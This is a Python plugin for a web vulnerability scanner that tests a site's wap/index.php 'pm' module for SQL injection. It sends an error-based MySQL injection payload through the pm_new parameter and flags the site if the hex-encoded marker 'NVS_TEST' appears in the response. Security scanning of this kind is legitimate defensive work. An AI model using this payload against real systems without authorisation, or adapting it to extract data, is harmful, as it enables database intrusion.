#!/usr/bin/python
# -*- coding: utf-8 -*-
from lib.common import *
def run_domain(http,ob):
    list=[]
    try:
        
        domain = ob['domain']
        detail=u"" 
        detail = detail.encode('utf8')
        url = "%s://%s%s" % (ob['scheme'],ob['domain'],ob['base_path'])
        url += "wap/index.php?mod=pm&pm_new=and(select%201%20from(select%20count(*),concat((select%20(select%20(select%20concat(0x27,0x7e,1,0x27,0x4E56535F54455354,2,0x27,0x7e)%20from%20information_schema.tables%20limit%200,1))%20from%20information_schema.tables%20limit%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%20and%201=1"
        res, content = requestUrl(http,url,ob['task_id'],ob['domain_id'])
        if content.find("NVS_TEST")>=0:
            request = getRequest(url)
            response = getResponse(res)
            list.append(getRecord(ob,url,ob['level'],detail,request,response))
    except Exception,e:
        logging.getLogger().error("File:JsgWapMoudleSqlINJECTION.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:JsgWapMoudleSqlINJECTION.py, run_domain function :" + str(e))
    #end try
    return list